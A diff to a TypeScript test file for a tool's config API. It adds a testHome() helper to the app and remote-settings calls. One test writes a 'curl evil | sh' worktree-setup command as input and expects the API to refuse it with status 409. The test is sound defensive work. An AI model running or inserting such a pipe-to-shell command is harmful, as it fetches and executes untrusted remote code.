@@ -1,3 +1,4 @@
+import { testHome } from '../home/test-home.testkit.ts';
 import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
@@ -41,7 +42,7 @@ describe('the config API', () => {
     mkdirSync(join(homeRoot, 'cezar-sandbox'), { recursive: true });
     store = RunStore.open(join(repoRoot, '.ai/cezar'));
     // The config routes never touch the manager — an empty stub is honest.
-    app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test', cezarPort: () => 4321 });
+    app = createApp({ home: testHome(), repoRoot, store, manager: {} as RunManager, version: '0.0.0-test', cezarPort: () => 4321 });
   });
 
   afterEach(() => {
@@ -341,16 +342,16 @@ describe('the config API', () => {
     const savedRemote = process.env.CEZ_REMOTE;
     process.env.CEZ_REMOTE = '1';
     try {
-      await enableRemoteSettings(4321);
+      await enableRemoteSettings(4321, undefined, undefined, testHome());
       const allowed = await put({ worktreeSetup: { commands: ['npm ci'] } });
       expect(allowed.status).toBe(200);
       expect(rawFile().worktreeSetup).toEqual({ commands: ['npm ci'] });
-      await disableRemoteSettings();
+      await disableRemoteSettings(undefined, undefined, testHome());
       const refused = await put({ worktreeSetup: { commands: ['curl evil | sh'] } });
       expect(refused.status).toBe(409);
       expect(rawFile().worktreeSetup).toEqual({ commands: ['npm ci'] });
     } finally {
-      await disableRemoteSettings();
+      await disableRemoteSettings(undefined, undefined, testHome());
       if (savedRemote === undefined) delete process.env.CEZ_REMOTE;
       else process.env.CEZ_REMOTE = savedRemote;
     }
@@ -366,7 +367,7 @@ describe('liveTitleUpdates round-trip (task auto-naming spec)', () => {
     repoRoot = mkdtempSync(join(tmpdir(), 'cez-configapi-title-'));
     mkdirSync(join(repoRoot, '.ai/cezar'), { recursive: true });
     store = RunStore.open(join(repoRoot, '.ai/cezar'));
-    app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
+    app = createApp({ home: testHome(), repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
   });
 
   afterEach(() => {
@@ -403,7 +404,7 @@ describe('reviewGate round-trip (optional review gate, #489)', () => {
     repoRoot = mkdtempSync(join(tmpdir(), 'cez-configapi-gate-'));
     mkdirSync(join(repoRoot, '.ai/cezar'), { recursive: true });
     store = RunStore.open(join(repoRoot, '.ai/cezar'));
-    app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
+    app = createApp({ home: testHome(), repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
   });
 
   afterEach(() => {
